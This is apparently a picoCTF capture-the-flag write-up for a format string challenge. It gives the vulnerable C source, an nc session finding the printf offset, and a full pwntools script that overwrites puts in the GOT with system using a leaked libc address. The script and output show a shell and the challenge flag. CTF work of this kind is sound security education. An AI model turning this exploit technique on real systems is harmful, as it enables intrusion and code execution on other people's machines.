### Format String 3 Writeup

Given binary, source code, libc, and interpreter.

The source code is as follows:

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
    puts("Howdy gamers!");
    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
    char *all_strings[MAX_STRINGS] = {NULL};
    char buf[1024] = {'\0'};

    setup();
    hello();    

    fgets(buf, 1024, stdin);    
    printf(buf);

    puts(normal_string);

    return 0;
}
```

Since `printf(buf)` is used, it can be exploited using a Format String Bug (FSB).

Additionally, because `puts(normal_string)` (with `normal_string` containing "/bin/sh") is executed, if we replace the `puts` address in the GOT with the address of the `system` function, we can get a shell and retrieve the flag.

For this, we need 3 pieces of information:
1. Offset when `printf` is executed
2. Address of `puts` in the GOT
3. Address of the `system` function in libc

The offset when `printf` is executed can be found by inputting `%n$p` into the program, which shows that the offset is 38:

```
$ nc rhea.picoctf.net 49961
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7f58edbd73f0
%38$p
0xa7024383325
/bin/sh
```

The address of `puts` in the GOT can be found using gdb, which shows 0x401080:

```
(gdb) p puts
$1 = {<text variable, no debug info>} 0x401080 <puts@plt>
```

The address of the `system` function in libc can change every time, so we need to calculate the difference with `setvbuf` in libc, and then add it to the `setvbuf` address provided by the instance.

This can be implemented using pwntools as follows:

```python
from pwn import *
from pwnlib.fmtstr import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        if len(sys.argv) < 3:
            log.error("Please provide the server address and port as arguments.")
            sys.exit(1)
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

context.arch='amd64'

exe = ELF('./format-string-3')
got_puts = exe.got['puts']
libc = ELF('./libc.so.6')
libc_system = libc.symbols['system']
print(f'libc system address: {hex(libc_system)}')
libc_setvbuf = libc.symbols['setvbuf']
print(f'libc setvbuf address: {hex(libc_setvbuf)}')
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

m = io.recvregex(b'libc: 0x([0-9a-f]+)\n', capture=True)
matched_string = m.group(0).decode()
log.info(f'matched_string: {matched_string}')

loaded_libc_setvbuf = int(m.group(1).decode(), 16)
log.info(f'loaded libc setvbuf found: {hex(loaded_libc_setvbuf)}')

loaded_libc_system = loaded_libc_setvbuf + (libc_system - libc_setvbuf)
log.info(f'loaded libc system: {hex(loaded_libc_system)}')

format_string = fmtstr_payload(38, {got_puts:loaded_libc_system}, numbwritten=0, write_size='byte')
# Exploit

io.sendline(format_string)

# Get flag/shell
io.interactive()
```

When executed, this script sends the payload to the instance and activates the shell:

```
$ python flag.py rhea.picoctf.net 49961
...
$ ls
Makefile
artifacts.tar.gz
flag.txt
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$ cat flag.txt
picoCTF{G07_G07?_cf6cb591}
```

Thankyou <3